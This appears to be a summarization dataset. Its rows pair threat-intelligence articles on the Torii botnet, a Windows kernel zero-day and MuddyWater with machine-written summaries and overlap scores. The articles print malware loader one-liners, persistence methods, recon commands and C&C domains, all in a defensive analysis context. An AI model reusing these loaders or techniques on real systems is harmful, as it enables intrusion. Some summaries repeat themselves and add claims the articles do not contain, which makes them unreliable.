fixed list:""/usr/bin""""/usr/lib""$HOME_PATH""/system/xbin""""/dev""$LOCATION_OF_1ST_STAGE""/var/tmp""""/tmp""and a filename from another list:""setenvi""""bridged""""swapper""""natd""""lftpd""""initenv""""unix_upstart""""mntctrd""etc.Putting these two items together creates the destination file path.Make the 2nd Stage PersistentAfterwards, the dropper makes sure that the second stage payload is executed and that it will remain persistent. It is unique in that it is remarkably thorough in how it achieves persistence. It uses at least six methods to make sure the file remains on the device and always runs. And, not just one method is executed - it runs all of them.Automatic execution via injected code into ~\.bashrc Automatic execution via ""@reboot"" clause in crontab Automatic execution as a ""System Daemon"" service via systemd Automatic execution via /etc/init and PATH. Once again, it calls itself ""System Daemon"" Automatic execution via modification of the SELinux Policy Management Automatic execution via /etc/inittabAnd, finally, it executes the dropped inner ELF - the second stage payload.Analysis of the 2nd stage payload (bot)The second stage payload is a full-fledged bot capable of executing commands from its master (CnC). It also contains other features such as simple anti-debugging techniques, data exfiltration, multi-level encryption of communication, etc.Furthermore, many functions found in the second stage are the same as in the first, making it highly likely they are both created by the same author(s).The code inside of the first stage payload is almost identical in all the versions. This is however not true in the case of the second stage where we find differences among the binaries for various hardware architectures. To describe the core functionality that can be found in most of the versions, we will once again take a look on x86 code found in the sample with SHA256 hash: 5c74bd2e20ef97e39e3c027f130c62f0cfdd6f6e008250b3c5c35ff9647f2abe.Anti-Analysis MethodsThe anti-analysis methods in this malware are not as advanced as we are accustomed to seeing in Windows or mobile malware, but they are improving.It uses the simple anti-analysis method of a 60 seconds sleep() after execution, which probably tries to circumvent simple sandboxes.Furthermore, it tries to randomize the process name via prctl(PR_SET_NAME) call to something like ""\[[a-z]{12,17}\]"" (regular expression) in order to avoid detection of blacklisted process names.Finally, the authors are trying to make the analysis harder by stripping the symbols from executables. When we first downloaded the samples from the aforementioned server 104.237.218.85, they all contained symbols, which made their analysis easier. It is interesting to note that a few days later these files were replaced by their stripped versions. No other differences were found between these two versions, leading us to believe that the authors are taking continual action to further protect their executables against analysis.CnC ServersAs we already said, this component is a bot that communicates with a master CnC server. The addresses of the CnCs are once again encrypted by the aforementioned XOR-based cipher. It seems that each Torii version contains 3 CnC addresses. The campaign that is currently running tries to get commands from CnC servers running at:top.haletteompson.comcloud.tillywirtz.comtrade.andrewabendroth.comIt tries to communicate with the first domain from the list and moves to the next one if it fails. In the case of failure, it also tries to resolve the domain name via Google DNS 8.8.8.8.Resolving CnC domain nameThese three domain names have resolved to IP 66.85.157.90 since September 15, 2018. Some other domains hosted on the same IP are also quite suspicious:cloud.tillywirtz.comdushe.cceditor.akotae.compress.eonhep.comweb.reeglais.compsoriasiafreelife.winq3x1u.psoriasiafreelife.winserver.blurayburnersoftware.comtop.haletteompson.comtrade.andrewabendroth.comwww.bubo.ccwww.dushe.ccThat so many strange looking domains are hosted at one IP address raises concern. Furthermore, the CnC domain names resolved to a different IP address (184.95.48.12) before that.(History of resolving DNS names hardcoded in the sample)Some more digging turned up another set of ELF samples belonging to Torii with three different CnC addresses:press.eonhep.comeditor.akotae.comweb.reeglais.comThey all resolved to the same IP (184.95.48.12) in the past and, for example ""press.eonhep.com"" was using this IP since December 8, 2017. Therefore, we think that this strain has been in existence since at least December 2017 and quite possibly longer.CnC CommunicationThe second stage communicates with these CnC servers via TCP port 443 as well as further encryption layers. It is interesting to note that it uses port 443 as a deception, as it doesn't communicate using TLS but takes advantage of common use of this port for HTTPS traffic. Each message (including replies) forms a structure we call a ""message envelope"" and each envelope is AES-128 encrypted and there is a MD5 checksum of the content to ensure it hasn't been modified or corrupted. Furthermore, each envelope contains a stream of messages where each message is encrypted by a simple XOR-based encryption, which is different than the one used to obfuscate the strings. It isn't as strong as it looks as the decryption keys are included in the communication.Algorithm used for encryption of CnC messagesTorii also exfiltrates the following information while connecting to a CnC server:HostnameProcess IDPath to second stage executableAll MAC addresses found in /sys/class/net/%interface_name%/address + its MD5 hash - this forms some kind of unique victim ID, allowing the bad actor to fingerprint and catalog devices more easily. It is also stored in local files with strange names such as GfmVZfJKWnCheFxEVAzvAMiZZGjfFoumtiJtntFkiJTmoSsLtSIvEtufBgkgugUOogJebQojzhYNaqyVKJqRcnWDtJlNPIdeOMKP, VFgKRiHQQcLhUZfvuRUqPKCtcrjmhtKcYQorAWhqAuZuWfQqymGnWiiZAsljnyNlocePAOHaKHvGoNXMZfByomZqEMbtkOEzQkQq, XAgHrWKSKyJktzLCMcEqYqfoeUBtgodeOjLgfvArTLeOkPSyRxqrpvFWRhRYvVcLeNtMKTdgFhwrypsRoIiDeObVxTTuOVfSkzgx, etc.Details found by uname() call, including sysname, version, release, and machine.Outputs of the following commands designed to gain yet more information on the target device:id 2>/dev/nulluname -a 2>/dev/nullwhoami 2>/dev/nullcat /proc/cpuinfo 2>/dev/nullcat /proc/meminfo 2>/dev/nullcat /proc/version 2>/dev/nullcat /proc/partitions 2>/dev/nullcat /etc/*release /etc/issue 2>/dev/nullCnC CommandsWhile analyzing the code, we've found that the bot component is communicating with the CnC with active polling in an endless loop, always asking its CnC whether there are any commands to execute. After receiving a command, it replies with the results of the command execution. Each message envelope has a value specifying which type of command it brings. The same value is used for reply. We have uncovered the following command types:0xBB32 - Store a file from CnC to a local drive :Receive:Filepath where to store content from CnC Content MD5 checksum of contentReply:File path where the file was stored Error code0xA16D - Receive value of timeout to be used for CnC polling :Receive:DWORD with number of minutes to sleep between CnC contactsReply:Message with code 660xAE35 - Execute a given command in a desired shell interpreter and send outputs back to CnC :Receive:Command to execute in shell (sh -c ""exec COMMAND"") WORD with execution timeout in seconds (max 60 seconds) String with a path to shell interpreter (optional)Reply:String with outputs (stdout + stderr) of command execution0xA863 - Store a file from CnC to a given path, change its flags to ""rwxr-xr-x"" to make it executable and then execute it :Receive:File path where to store content from CnC Content MD5 checksum of contentReply:File path where the file was stored Return code from execution of that file0xE04B - Check that the given file exists on a local system and return its size :Receive:Filepath to checkReply:File path File size0xF28C - Read N bytes from offset O of selected file F and send them to CnC :Receive:File path to file (F) to read from QWORD offset (O) where to start reading DWORD number (N) of bytes to readReply:File content Offset Size of bytes read MD5 checksum of read content0xDEB7 - Delete a specified fileReceive:Name of a file to deleteReply:Error code0xC221 - Download a file from the given URLReceive:Path where to a store file URLReply:File path URL0xF76F - Get address of a new CnC server and start communication with it.Receive:? New domain name New port ?Reply:Repeat the received information0x5B77, 0x73BF , 0xEBF0, and probably other codes - Some kind of communication to ping or get a heartbeat on the target device to ensure the communication partner that the communication channel is working) :Receive:Everything received is ignoredReply:Repeat the received informationAnalysis of the sm_packed_agentWhile we were investigating the server, we found another interesting binary we managed to get from the FTP server that is called ""sm_packed_agent"". We don't have any evidence that is has been used on the server, but its versatility suggests that it could be used to send any remote command desired to the target device. It contains a GO-written application packed using UPX when unpacked, it has a few interesting strings that suggests it has server-like capabilities:Underneath, it uses the following 3rd party libraries:Code Reusehttps://github.com/shirou/ gopsutil /hosthttps://github.com/shirou/gopsutil/cpuhttps://github.com/shirou/gopsutil/memhttps://github.com/shirou/gopsutil/ netPossible name of source code:/go/src/Monitor_GO/agent/agent.go/go/src/Monitor_GO/sm_agent.goSome of these libraries are abusing a BSD licence, which requires redistribution of copyright notice. Apparently Torii's authors don't care about copyright infringement.FunctionalityThe functionality of the sm_agent is as follows:Takes one parameter on cmdline -p with port numberInitializes crypto, loads TLS and keys + certCreates server and listening for TLS connectionAwaits commands encoded in BSON formatCommand handler inside knows these commands:1: Monitor_GO_agent__Agent_GetSystemInfo2: Monitor_GO_agent__Agent_GetPerformanceMetrics7: Monitor_GO_agent__Agent_ExecCmdWithTimeoutthis command seems to be able to run any arbitrary OS command read from BSON payload.TLS encryption, certificates and keys:Agent uses ChaCha20-Poly1305 stream cipher for TLSKeys and certs in the same directorySelf signed certificate of authority ca.crt with name Mayola Mednickclient.crt issued by ca.crt for Dorothea Gladdingserver.crt + server.key issued by ca.crt for Graham TudiscoCertificates are self-signed and obviously using fake names.Start-agent.shThis script is to kill any previous instances of start sm_packed_agent and run it on TCP port 45709 and re-run it again in case it fails.A script which runs and keeps running sm_packed_agentIt is not yet known how Torii authors are using this service, but it is incredibly versatile and could be used to run any command on the device. And because this application is written in GO, it can be easily recompiled to run on virtually any architecture. Taking into account that this file is running on a malware distribution machine, it is quite possible that it is a backdoor or even a service to orchestrate multiple machines.Analysis of Logs From the Server 104.237.218.85Finally, we took a look at the logs we found for both the Nginx server and the FTP server. Such access log can help us understand how many clients actually were infected by Torii or tried to download it.As we write this blog, Torii authors have already disabled FTP and Nginx logging (more on that below), but looking at the logs that are available, we can generate some simple statistics.A total of 206 unique IPs connected to the server on September 7th, 8th, 19th, and 20th according to the logs on the server.Access-2018-09-07.log - 54 unique IPsAccess-2018-09-08.log - 20Access-2018-09-19.log - 189Access-2018-09-20.log - 10It looks like one IP 38.124.61.111 connected to the server 1 056 393 times!By looking into the logs, it seems that someone actually ran DirBuster-1.0-RC1, trying to figure out what is going on. Brute force DirBuster is used to guess directories/filenames on the web server and generates a large number of requests. It is quite unfortunate if this scan originated from a researcher as there are more elegant approaches in the case of a sophisticated malware like Torii.By scanning the ports of IP 38.124.61.111, we can see that there are a few ports open:On port 27655, there is an SSH banner which states:""SSH-2.0-OpenSSH_7.4p1 Raspbian-10+deb9u3"" It looks like this box is running Raspbian. If you are behind this, write us.Other logs that are available to us are FTP server logs.There are a few clients that connected and downloaded some files that are not on the FTP server anymore:Sat Sep 8 08:31:24 2018 1 128.199.109.115 6 /media/veracrypt1/nginx/md/zing.txt b _ o r md ftp 0 * cAccording to logs we were able to analyze, a total of 592 unique clients were downloading files from this server over a period of a few days. It's important to remember that once the target device receives the payload, it stops connecting to the download server and connects to the CnC server. Therefore, we are likely seeing a snapshot of new devices that were recruited into this botnet over the period of time for which we have log files.Additionally, there are 8 clients that were using both the HTTP server and the FTP server, which could be the case if downloading using HTTP failed for some reason, or if Torii authors were testing functionality of the bash script or a server set upWe cannot speculate about what we do not have evidence for, but this server could be just one of a number of servers infecting new target devices, and only further investigation will reveal the true scope of this botnet. Given the level of sophistication of the malware we researched, it would seem likely that it is designed to map and control a large number of diverse devices.ConclusionEven though our investigation is continuing, it is clear that Torii is an example of the evolution of IoT malware, and that its sophistication is a level above anything we have seen before. Once it infects a device, not only does it send quite a lot of information about the machine it resides on to the CnC, but by communicating with the CnC, it allows Torii authors to execute any code or deliver any payload to the infected device. This suggests that Torii could become a modular platform for future use. Also, because the payload itself is not scanning for other potential targets, it is quite stealthy on the network layer.Stay tuned for the follow ups.IoCCnCtop.haletteompson.com?loud.tillywirtz.comtrade.andrewabendroth.compress.eonhep.comeditor.akotae.comweb.reeglais.comIP184.95.48.12104.237.218.82104.237.218.8566.85.157.90Avast is a global leader in cybersecurity, protecting hundreds of millions of users around the world. Protect all of your devices with award-winning virus protection. Safeguard your privacy and encrypt your online connection with SecureLine VPN.Learn more about products that protect your digital life at avast.com. And get all the latest news on today's cyberthreats and how to beat them at blog.avast.com.";The ITSecurity report states that the malware is a bot that communicates with a master CnC server. The addresses of the CnCs are once again encrypted by the aforementioned XORbased cipher. It seems that each Torii version contains 3 CnC addresses. The campaign that is currently running tries to get commands from CnC servers running at:top.haletteompson.comcloud.tillywirtz.comtrade.andrewabendroth.comIt tries to communicate with the first domain from the list and moves to the next one if it fails. In the case of failure, it also tries to resolve the domain name via Google DNS 8.8.8.8. Resolving CnC domain nameThese three domain names have resolved to IP 66.85.157.90 since September 15, 2018. Some other domains hosted on the same IP are also quite suspicious:cloud.tillywirtz.comdushe.cceditor.akotae.comcompress.eonhep.comweb.reeglais.compsoriasiafreelife.winq3x1u.psoriasiafreelife.winserver.blurayburnersoftware.comtop.haletteompson.comtrade.andrewabendroth.comwww.bubo.ccwww.dushe.ccThat so many strange looking domains are hosted at one IP address raises concern. The bot component is communicating with the CnC with active polling in an endless loop, always asking its CnC whether there are any commands to execute. After receiving a command, it replies with the results of the command execution. Each message envelope has a value specifying which type of command it brings. The;en;{'r': 0.11646586345381527, 'p': 0.9666666666666667, 'f': 0.2078853027402012};{'r': 0.07414238288454444, 'p': 0.95260663507109, 'f': 0.13757700071345985};{'r': 0.11646586345381527, 'p': 0.9666666666666667, 'f': 0.2078853027402012}
https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/;Zero-day exploit (CVE-2018-8453) used in targeted attacks;"Yesterday, Microsoft published their security bulletin, which patches CVE-2018-8453, among others. It is a vulnerability in win32k.sys discovered by Kaspersky Lab in August. We reported this vulnerability to Microsoft on August 17, 2018. Microsoft confirmed the vulnerability and designated it CVE-2018-8453.In August 2018 our Automatic Exploit Prevention (AEP) systems detected an attempt to exploit a vulnerability in Microsoft Windows operating system. Further analysis into this case led us to uncover a zero-day vulnerability in win32k.sys. The exploit was executed by the first stage of a malware installer to get necessary privileges for persistence on the victim's system. The code of the exploit is of high quality and written with the aim of reliably exploiting as many different MS Windows builds as possible, including MS Windows 10 RS4.So far, we detected a very limited number of attacks using this vulnerability. The victims are located in the Middle East.Kaspersky Lab products detected this exploit proactively through the following technologies:Behavioral detection engine and Automatic Exploit Prevention for endpoints Advanced Sandboxing and Anti Malware engine for Kaspersky Anti Targeted Attack Platform (KATA)Kaspersky Lab Verdicts for the artifacts in this campaign are:HEUR:Exploit.Win32.GenericHEUR:Trojan.Win32.GenericPDM:Exploit.Win32.GenericMore information about this attack is available to customers of Kaspersky Intelligence Reports. Contact: intelreports@kaspersky.comTechnical detailsCVE-2018-8453 is a Use-After-Free inside win32kfull!xxxDestroyWindow that resembles an older vulnerability -- CVE-2017-0263. CVE-2017-0263 was originally deployed by the Sofacy APT, together with a PostScript exploit, back in 2017.For technical analysis of the vulnerability, we completely reverse-engineered the ITW exploit sample obtained and rewrote it into a full Proof of Concept.The exploitation of this vulnerability depends on a sequence of events that are performed from hooks set on three usermode callback functions - fnDWORD, fnNCDESTROY, and fnINLPCREATESTRUCT. The exploit installs these hooks by replacing the function pointers in the KernelCallbackTable:Inside the fnINLPCREATESTRUCT hook, the exploit initializes a ""SysShadow"" window by explicitly assigning a position to it:When processing the WM_LBUTTONDOWN message, the fnDWORD hook executes the DestroyWindow function on the parent, which results in the window being marked as free and subsequently freed by the garbage collector.The issue lies inside the fnNCDESTROY hook that is performed during execution of the DestroyWindow function. This hook executes the NtUserSetWindowFNID syscall, which contains a flawed logic to change the fnid status of the window without properly checking if it is set to FNID_FREED.The fnid status of the window is located at offset 0x02a in the tagWND structure:kd> dt win32k!tagWND...+0x02a fnid : Uint2BWhen the scrollbar is initially created, it has the value FNID_SCROLLBAR (0x029A).The next diagram shows the value of fnid prior and after execution of the NtUserSetWindowFNID syscall:We can check what the new fnid value is by verifying it against the ReactOS source code:/* FNIDs for NtUserSetWindowFNID, NtUserMessageCall */define FNID_SCROLLBAR 0x029A...define FNID_BUTTON 0x02A1...define FNID_FREED 0x8000 /* Window being Freed... */This action results in the first scrollbar being destroyed, while the system still maintains a reference to a ""SysShadow"" class, as the scrollbar fnid is no longer marked as FNID_FREED, but as FNID_BUTTON instead.To successfully reclaim the freed memory pool, the exploit contains a number of different feng shui tactics. The spray procedure is dependent on the exploited Windows version, and because the exploit targets a wide range of operating systems, it includes five separate functions for spraying:For the latest supported version (Windows 10 RS4), the spray tactic is quite complicated. The kernel is sprayed with bitmap objects of different size. This is required to exhaust the memory allocator to eventually bypass the Low Fragmentation Heap security mitigations that were significantly improved in the latest Windows builds:This leads to the following memory layout, where USERTAG_SCROLLTRACK is the freed pool allocation:When another scrollbar is allocated, the SysShadow class memory reference is reused, but its contents are attacker-controlled, because the freed Usst (ffffee30044b2a10) and Gpbm (ffffee30044b2a90) pools were merged into a single block:This results in a powerful arbitrary kernel Read\Write using GDI Bitmap primitives that works even on the latest Windows versions.Following successful exploitation, a slightly modified Token-stealing payload is used to swap the current process Token value with the one from the SYSTEM EPROCESS structure:So far, we've observed the usage of this exploit in a small number of targeted attacks, when the exploit is packaged in a malware installer. The installer requires system privileges to install its payload. The payload is a sophisticated implant, used by the attackers for persistent access to the victims' machines. Some of its main characteristics include:Encrypting the main payload using AES-256-CBC with the SHA-1 of the SMBIOS UUID (this makes it impossible to decrypt the payload on machines other than the victim, if the SMBIOS UUID is not known)Using Microsoft BITS (Background Intelligent Transfer Service) for communicating with its C&C servers, an unusual techniqueStoring the main payload in a randomly named file on disk, the loader contains a hash of the filename and attempts to find the payload by comparing the filename hash for all files in the Windows directoryMore details on this malware and the APT behind it are available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.comVictimsThe distribution of the attack seems to be highly targeted, affecting less than a dozen victims in the Middle East region, according to our telemetry.AttributionDuring our investigation, we discovered the attackers were using a PowerShell backdoor that has previously been seen exclusively used by the FruityArmor APT. There is also an overlap in the domains used for C2 between this new set of activity and previous FruityArmor campaigns. That makes us assess with medium confidence that FruityArmor is responsible for the attacks leveraging CVE-2018-8453.ConclusionEven when deploying 0-days seems to be more frequent than it used to be, this would be the second time we have spotted FruityArmor using one of them to distribute its malware. This points to the resources and sophistication of this actor, along with the advanced final-stager they distribute.So far, this campaign has been extremely targeted, affecting a very low number of victims in the Middle East region, probably persons of interest for the attackers. However, the victimology is not clear, especially with such a small number of victims involved.We believe that although FruityArmor's activity has been slowly increasing during the last two years, the extremely targeted nature of the attacks helps them fly below the radar.Appendix I - Indicators of compromise:Domains:weekendstrips[.]netshelves-design[.]com";Microsoft has released a patch for CVE20188453. The patch can be downloaded from Microsoft's website. FruityArmor is a sophisticated cyberespionage group that has been active since at least 2015. It is believed to be based in the Middle East and is known for its use of 0day exploits and advanced finalstager malware. Microsoft has released a patch for CVE20188453. The patch can be downloaded from Microsoft's website. FruityArmor is a sophisticated cyberespionage group that has been active since at least 2015. It is believed to be based in the Middle East and is known for its use of 0day exploits and advanced finalstager malware. Microsoft has released a patch for CVE20188453. The patch can be downloaded from Microsoft's website. FruityArmor is a sophisticated cyberespionage group that has been active since at least 2015. It is believed to be based in the Middle East and is known for its use of 0day exploits and advanced finalstager malware. Microsoft has released a patch for CVE20188453. The patch can be downloaded from Microsoft's website. FruityArmor is a sophisticated cyberespionage group that has been active since at least 2015. It is believed to be based in the Middle East and is known for its use of 0day exploits and advanced finalstager malware. Microsoft has released a patch for CVE20188453. The patch can be downloaded from Microsoft's;en;{'r': 0.047080979284369114, 'p': 0.5681818181818182, 'f': 0.0869565203258072};{'r': 0.0106951871657754, 'p': 0.19230769230769232, 'f': 0.020263423520559622};{'r': 0.047080979284369114, 'p': 0.5681818181818182, 'f': 0.0869565203258072}
https://securelist.com/muddywater/88059/;MuddyWater expands operations;"SummaryMuddyWater is a relatively new APT that surfaced in 2017. It has focused mainly on governmental targets in Iraq and Saudi Arabia, according to past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US. We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and educational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other victims were also detected in Mali, Austria, Russia, Iran and Bahrain.. These new documents have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing.The new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers' arsenal but also some OPSEC mistakes made by the attackers.Previous related research:https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/https://www.sekoia.fr/blog/falling-on-muddywater/Decoy images by countryJordanThe Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.docTurkeyTurkey's General Directorate of Security Turkey's Directorate General of Coastal SafetyTurkey's General Directorate of Security (Onemli Rapor.doc) Turkey's Ministry of the Interior (Early election.doc)Saudi ArabiaKSA King Saud University (KSU) KSA King Saud University (KSU)AzerbaijanIraqIraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of MinistersPakistanECP.doc National Assembly of Pakistan.docAfghanistanTechnical detailsBelow is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware.The initial infection vectorThe initial infection starts with macro-enabled Office 97-2003 Word files whose macros are usually password-protected to hinder static analysis.Malicious obfuscated VBA code is executed when the macro is first enabled. In some cases, the malicious macro is also executed when the user activates a fake text box.The macro payload analysis, dropped files and registry keysThe macro payload, which is Base64 encoded, does the following:Drops two or three files into the ""ProgramData"" folder. The dropped files are either in the root of the ""ProgramData"" folder or in a subdirectory. The file names may vary from one version of the malware to another.\EventManager.dll\EventManager.logs\WindowsDefenderService.inilAdds a registry entry in the current user's RUN key (HKCU) for later execution when the user next logs in. In some cases, the macro spawns the malicious payload/process instantly without waiting for the next time the user logs in. The registry keys and executables may vary from one version of the malware to another.Name:WindowsDefenderUpdaterType:REG_EXPAND_SZData:c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1,The next time the user logs in, the dropped payload will be executed. The executables have been chosen specifically for bypassing allowlisting solutions since they are all from Microsoft and very likely allowlisted. Regardless of the file extensions, the files dropped by the macro are EITHER INF, SCT and text files OR VBS and text files.Case 1: INF, SCT and text files dropped by the macroINF is launched via the advpack.dll ""LaunchINFSection"" function. INF registers the SCT file (scriptlet file) via scrobj.dll (Microsoft Scriptlet library). Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file.powershell.exe -exec Bypass -c $s=(get-content C:\\ProgramData\\WindowsDefenderService.ini),$d = @(),$v = 0,$c = 0,while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40),if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256,if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1,},[array]::Reverse($d),iex([String]::Join("",$d)),PowerShell one-linerExecution flow:Case 2: VBS and text files dropped by the macroThe VBS file decodes itself and calls mshta.exe, passing on one line of VBScript code to it, which in turn spawns a PowerShell one-liner which finally consumes the text file (usually Base64-encoded text).powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\ProgramData\ZIPSDK\ProjectConfManagerNT.ini)))),PowerShell one-linerExecution flow:The PowerShell codeWhen PowerShell is invoked whether via WMI, wscript.exe, or mshta.exe, it executes a one-liner PowerShell code (as outlined above) that reads the encoded text file dropped in ProgramData and then decodes it. The resulting code has multiple layers of obfuscation.The first thing the PowerShell code does is to disable office ""Macro Warnings"" and ""Protected View"". This is to ensure future attacks don't require user interaction. It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks.Next, it checks the running processes against a list of hard-coded process names, if any are found, the machine is forcefully rebooted. The names are linked to various tools used by malware researchers.""win32_remote"",""win64_remote64"",""ollydbg"",""ProcessHacker"",""tcpview"",""autoruns"",""autorunsc"",""filemon"",""procmon"",""regmon"",""procexp"",""idaq"",""idaq64"",""ImmunityDebugger"",""Wireshark"",""dumpcap"",""HookExplorer"",""ImportREC"",""PETools"",""LordPE"",""dumpcap"",""SysInspector"",""proc_analyzer"",""sysAnalyzer"",""sniff_hit"",""windbg"",""joeboxcontrol"",""joeboxserver""Denylisted process names in the malwareIn some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll ""NtRaiseHardError"" function.CnC communicationA URL is selected at random from a long list of embedded URLs held in an array named $dragon_middle. The selected URL is subsequently used for communication with the CnC server. If it can't send data to the chosen CnC URL, it tries to obtain another random URL from $middle_dragon, then sleeps from one to 30 seconds and loops again.Victim system reconnaissanceThe code then tries to obtain the victim's public IP via ""https://api.ipify.org/"".The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim. This allows the attackers to accept or reject victims depending on their IPs, countries, geolocations, target enterprises, etc. Depending on the response from the attacker's CnC, the victim is assigned an ID $sysid. This ID is sent to the CnC with each request for commands to execute.Supported commands""upload"", ""screenshot"", ""Excel"", ""Outlook"", ""risk"", ""reboot"", ""shutdown"", ""clean"". These commands vary from one version to another.The ""screenshot"" command takes a screenshot that is saved as a.PNG file in ""ProgramData"". The ""Excel"" command receives another stage of the PowerShell code, saves it in ""c:\programdata\a.ps1"" and then asks Excel to execute this PowerShell script via DDE. The ""Outlook"" command receives another stage of the PowerShell code, saves it in ""c:\programdata\a.ps1"" and then asks Outlook via COM, via MSHTA.exe, to execute it. The ""risk"" command receives another stage of the PowerShell code, saves it in ""c:\programdata\a.ps1"" and then asks Explorer.exe via COM interaction to execute it. The ""upload"" command downloads files from the CnC and saves them locally in ""C:\ProgramData"". The ""clean"" command destroys the victim's disk drives C, D, E, F and then reboots. The ""reboot"" and ""shutdown"" commands immediately reboot and shut down the victim's machine.In one version of the malware, the code checks if the ""ProgramData"" folder has folders or files with the keywords ""Kasper"", ""Panda"", or ""ESET"".VictimologyMost victims of MuddyWater were found in Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan and Azerbaijan. Other victims were also recorded in Russia, Iran, Bahrain, Austria and Mali. The malicious decoy documents used in the attacks suggest they are geopolitically motivated, targeting sensitive personnel and organizations.Attacker deception and attributionThe deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes. Multiple documents used in the attacks also contain embedded paths from their authors' machines. These paths are embedded by Office under various circumstances, for instance, when somebody adds a binary object (an OLE control, e.g. text box or command button) into a Word document. The paths discovered are:* C:\Users\leo\AppData\Local\Temp\Word8.0\MSForms.exd* C:\Users\poopak\AppData\Local\Temp\Word8.0\MSForms.exd* C:\Users\Vendetta\AppData\Local\Temp\Word8.0\MSForms.exd* C:\Users\Turk\AppData\Local\Temp\Word8.0\MSForms.exdLeo, Poopak, Vendetta and Turk are the usernames of those creating the documents or the templates on which they are based. Turk could point to a person of Turkish origin. Poopak is a Persian girl's name or might suggest the authors are not entirely happy with ""Pak"", which could be short for Pakistan. Leo could be one of the attacker's names. We also don't rule out the possibility of false flags, with the attackers using random usernames to confuse researchers.In multiple instances, we have also found Chinese text inside the samples, possibly indicating the reuse of code by the attackers.????????????...???????????????????????Chinese text found in PowerShell code in multiple samplesUnable to connect to the URL, please wait for the dragon...Unable to access local computer registerTask Scheduler access deniedTranslation of Chinese textWe have also noticed that for some samples, e.g. 5a42a712e3b3cfa1db32d9e3d832f8f1, the PowerShell code had only three CnC URLs, which leads us to believe that most of the CnC URLs in $dragon_middle found in other samples could actually be 'noise' to distract researchers or trigger false positives.http://www.cankayasrc[.]com/style/js/main.phphttp://ektamservis[.]com/includes/main.phphttp://gtme[.]ae/font-awesome/css/main.phpRecommendations for organizationsEffective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems.The best way to prevent attackers from finding and leveraging security holes, is to eliminate the holes altogether, including those related to improper system configurations or errors in proprietary applications. Organizations are also recommended to implement the following steps for an enhanced level of protection at their premises.Use PowerShell Constrained Language Mode as it uses IEX, Add-Type, and New-Object. Lock PowerShell Execution Policy, must be set to ""AllSigned"" via GPO. An allowlisting solution to prevent certain process child-parent execution hierarchies.ConclusionThe MuddyWaters group has carried out a large number of attacks and demonstrated advanced social engineering, in addition to the active development of attacks, infrastructure and the use of new methods and techniques. The attackers are actively improving their toolkit in an effort to minimize their exposure to security products and services. Kaspersky Lab expects these types of attacks to intensify in the near future.In order to protect your company from malware, Kaspersky Lab researchers recommend implementing the following measures:Educate generic staff to be able to distinguish malicious behavior like phishing links.Educate information security staff to have full configuration, investigative and hunting abilities.Use a proven corporate-grade security solution in combination with anti-targeted attack solutions capable of detecting attacks by analyzing network anomalies.Provide security staff with access to the latest threat intelligence data, which will arm them with helpful tools for targeted attack prevention and discovery, such as indicators of compromise and YARA rules.Make sure enterprise-grade patch management processes are well established and executed.High-profile organizations should have elevated levels of cybersecurity, attacks against them are inevitable and are unlikely to ever cease.Additional informationIn the advanced stages of this research, we were able not only to observe additional files and tools from the attackers' arsenal but also some OPSEC mistakes made by the attackers.Further details about the attackers' arsenal, additional indicators of compromise, YARA rules and attribution information is available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.comIndicators of 